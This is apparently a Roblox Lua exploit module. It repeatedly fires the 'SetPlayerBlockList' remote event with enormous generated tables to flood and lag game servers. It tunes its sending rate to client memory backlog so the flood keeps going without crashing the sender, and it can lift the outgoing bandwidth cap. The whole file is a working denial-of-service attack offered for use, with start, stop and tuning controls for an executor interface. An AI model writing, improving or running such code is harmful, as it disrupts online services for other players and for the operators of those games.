local SRC = [==[
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")

-- ═══════════ YOUR METHOD ═══════════
local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1.5
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false
local Format         = "pair"   -- pair | compact | flat
-- ═══════════════════════════════════

-- ═══════════ PACING ═══════════
local StartInterval  = 2.5
local MinInterval    = 0.30
local MaxInterval    = 15.0
local BackoffFactor  = 1.45
local SpeedupFactor  = 0.88
local SpeedupAfter   = 4
local PanicMB        = 250
local StartDelay     = 0.10
local BuildYieldEvery = 100000
local CapOutgoing    = false
-- ══════════════════════════════

-- rough serialized bytes per entry, used only for the readout
local BYTES_PER_ENTRY = { pair = 15, compact = 13, flat = 9 }

local RemoteCandidates = {
    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
    { "ReplicatedStorage",       "SetPlayerBlockList" },
}

local state = {
    running = false, thread = nil, remote = nil, cache = nil,
    ms = 0, passes = 0, errors = 0, mem = 0, base = nil, queued = 0,
    payloadMb = 1, reason = "", interval = StartInterval, children = 0,
    samples = {},
}

local function getMem()
    local ok, mb = pcall(function() return Stats:GetTotalMemoryUsageMb() end)
    if ok and type(mb) == "number" then return mb end
    local ok2, mb2 = pcall(function() return Stats:GetMemoryUsageMb() end)
    if ok2 and type(mb2) == "number" then return mb2 end
    return nil
end

local function pushSample(m)
    local s = state.samples
    s[#s + 1] = m
    while #s > 10 do table.remove(s, 1) end
    local lo = math.huge
    for _, v in ipairs(s) do if v < lo then lo = v end end
    if lo < math.huge then state.base = lo end
end

local function resolve()
    for _, path in ipairs(RemoteCandidates) do
        local node, ok = game, true
        for i = 1, #path do
            local nxt = node:FindFirstChild(path[i])
            if not nxt then ok = false; break end
            node = nxt
        end
        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
            return node
        end
    end
    return nil
end

local function estimatePayloadMb()
    return math.max(Children * (BYTES_PER_ENTRY[Format] or 15) / 1000000, 0.05)
end

if CapOutgoing then
    pcall(function()
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
    end)
end

local function build(yieldAllowed)
    local n = Children
    local root = table.create(n)

    if Format == "flat" then
        for i = 1, n do
            root[i] = i
            if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
        end
        return root
    end

    if Format == "compact" then
        for i = 1, n do
            root[i] = { i, i * 2 }
            if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
        end
        return root
    end

    local pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
    for i = 1, n do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
        if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
    end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload = state.cache
    if RebuildEach or not payload then
        payload = build(false)
        if not RebuildEach then state.cache = payload end
    end
    for _ = 1, FireBurst do
        state.remote:FireServer(payload)
    end
end

local function rebuild()
    state.cache = build(true)
    state.children = Children
    state.payloadMb = estimatePayloadMb()
    state.samples = {}
    state.interval = StartInterval
end

local function start()
    if state.running then return end
    state.running = true
    state.errors, state.reason = 0, ""

    state.thread = task.spawn(function()
        if StartDelay > 0 then task.wait(StartDelay) end

        rebuild()
        task.wait(0.4)

        local m0 = getMem()
        if m0 then pushSample(m0) end

        -- calibration send, then measure the real weight of one payload
        if not state.remote then state.remote = resolve() end
        if state.remote and m0 then
            local c0 = os.clock()
            pcall(fire)
            task.wait(0.3)
            local peak = getMem()
            if peak and peak > m0 then
                state.payloadMb = math.max(peak - m0, estimatePayloadMb())
            end
            task.wait(math.max(0, StartInterval - (os.clock() - c0)))
            local f = getMem()
            if f then pushSample(f) end
        end

        local interval = StartInterval
        local good = 0

        while state.running do
            if not state.remote then
                state.remote = resolve()
                if not state.remote then task.wait(0.25); continue end
            end

            -- current backlog estimate
            local m = getMem()
            local queued = 0
            if m and state.base then
                queued = math.max(m - state.base, 0)
                state.queued = queued
            end

            -- AIMD: hold roughly one payload of backlog
            local hi = state.payloadMb * 2.5
            local lo = state.payloadMb * 1.2

            if queued > PanicMB then
                interval = MaxInterval
                good = 0
                state.reason = "panic backoff"
            elseif queued > hi then
                interval = math.min(interval * BackoffFactor, MaxInterval)
                good = 0
                state.reason = "backing off"
            elseif queued < lo then
                good += 1
                if good >= SpeedupAfter then
                    good = 0
                    interval = math.max(interval * SpeedupFactor, MinInterval)
                end
                if interval <= MinInterval then state.reason = "at floor" end
            else
                state.reason = ""
            end

            local f0 = os.clock()
            local ok = pcall(fire)
            local cost = os.clock() - f0
            state.ms = cost * 1000
            state.interval = interval

            if ok then
                state.passes += 1
                state.errors = 0
            else
                state.errors += 1
            end

            if state.errors > 30 then
                state.running = false
                state.reason = "remote errors"
                break
            end

            task.wait(math.max(0.05, interval - cost))

            local m2 = getMem()
            if m2 then
                state.mem = m2
                pushSample(m2)
            end
        end
    end)
end

local function stop()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread, state.cache = nil, nil
    state.ms, state.queued = 0, 0
end

local function setChildren(n)
    Children = math.max(1000, math.floor(n))
    state.cache = nil
    state.children = Children
    state.payloadMb = estimatePayloadMb()
end

local function setFormat(f)
    if f ~= "pair" and f ~= "compact" and f ~= "flat" then return end
    Format = f
    state.cache = nil
    state.payloadMb = estimatePayloadMb()
end

return {
    start  = start,
    stop   = stop,
    toggle = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
    setChildren = setChildren,
    children = function() return Children end,
    setFormat = setFormat,
    format = function() return Format end,
    stats = function()
        return state.ms, state.passes, state.mem, Children, state.queued,
               state.reason, state.payloadMb, state.interval
    end,
}
]==]

